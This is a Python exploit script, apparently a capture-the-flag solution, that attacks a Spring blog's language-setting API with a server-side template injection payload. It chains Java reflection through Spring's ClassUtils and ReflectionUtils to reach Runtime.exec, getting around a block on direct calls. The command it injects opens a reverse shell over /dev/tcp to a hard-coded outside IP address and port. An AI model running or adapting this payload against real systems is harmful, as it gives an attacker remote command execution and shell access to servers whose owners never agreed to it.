import httpx
from pwn import *

URL = "https://holo-blog.multi.web.id/"

context.log_level = logging.DEBUG


class BaseAPI:
    def __init__(self, url=URL) -> None:
        self.c = httpx.Client(base_url=url)

    def setLang(s, lang):
        return s.c.patch("/api/lang", json={
            "lang": lang
        })

    def refresh(s):
        return s.c.get("/api/refresh")

    def home(s):
        return s.c.get("/")


class API(BaseAPI):
    ...

cmd = 'sh -c $@|bash . echo sh -i >& /dev/tcp/108.137.37.157/4444 0>&1'

concat_idx = 47
# concat_idx = 72
java_lang_runtime = f"''.getClass().getMethods()[{concat_idx}].invoke(''.getClass().getMethods()[{concat_idx}].invoke('j','ava.lang.R'),'untime')"
get_runtime = f"''.getClass().getMethods()[{concat_idx}].invoke('getR','untime')"
txt_exec = f"''.getClass().getMethods()[{concat_idx}].invoke('e','xec')"

# calling runtimeExec will get you an error, so we need to bypass it using this CVE:
# https://github.com/p1n93r/SpringBootAdmin-thymeleaf-SSTI
classUtils = f"''.getClass().forName('org.springframework.util.ClassUtils')"
reflectionUtils = f"''.getClass().forName('org.springframework.util.ReflectionUtils')"
classLoader = f"{classUtils}.getDefaultClassLoader()"
runtimeClassLoader = f"{classUtils}.forName({java_lang_runtime},{classLoader})"
runtimeGetRuntimeMethod = f"{reflectionUtils}.findMethod({runtimeClassLoader},{get_runtime})"
runtimeObj = f"{reflectionUtils}.invokeMethod({runtimeGetRuntimeMethod},null)"
runtimeExecMethod = f"{reflectionUtils}.findMethod({runtimeClassLoader},{txt_exec},''.getClass())"
payload = "${"
payload += f"{reflectionUtils}.invokeMethod({runtimeExecMethod},{runtimeObj},'"+cmd+"')"
payload += "}"

if __name__ == "__main__":
    api = API()
    res = api.setLang("id")
    cookies = res.cookies
    res = api.refresh()
    api.c._cookies = cookies
    res = api.setLang("__"+payload+"__::")
    print(res.text)
    res = api.home()
    print(res.text)
